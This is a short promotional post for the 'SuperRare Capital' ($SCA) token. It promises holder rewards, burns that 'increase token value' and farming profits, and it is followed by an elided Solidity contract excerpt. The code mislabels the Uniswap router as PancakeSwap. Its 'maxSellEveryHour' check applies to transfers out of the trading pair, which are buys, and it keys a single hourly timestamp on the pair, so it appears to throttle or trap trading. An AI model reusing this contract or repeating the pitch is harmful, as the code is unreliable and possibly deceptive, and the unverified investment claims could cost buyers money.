...
SuperRare Capital - You trade $SCA on Ethereum, we farm on multiple chains and return profits to holders
- Liquidity locked 1 year

Tax Buy / Tax Sell: 14%
WHY SHOULD INVEST IN RARE
- 99% burned at launch
- 4% of each transaction distributed to the holders
- 10% of each transaction burned to increase token value

Telegram: @SuperRareCapital

Website: https://superrare.finance
...
contract SuperRareCapital is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    string private _name = "SuperRare Capital";
    string private _symbol = "SCA";
    uint8 private _decimals = 9;

    uint256 maxSellEveryHour = 25;
    ...
    constructor() {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // binance PANCAKE V2
    ...
    function _tokenTransfer(
        ...
        if(sender == uniswapV2Pair && !_isExcludedFromFee[sender]){
            require(amount <= balanceOf(sender).mul(maxSellEveryHour).div(100));
            require(block.timestamp >= _timestamp[sender]);
            _timestamp[sender] = block.timestamp.add(1 hours);
        }
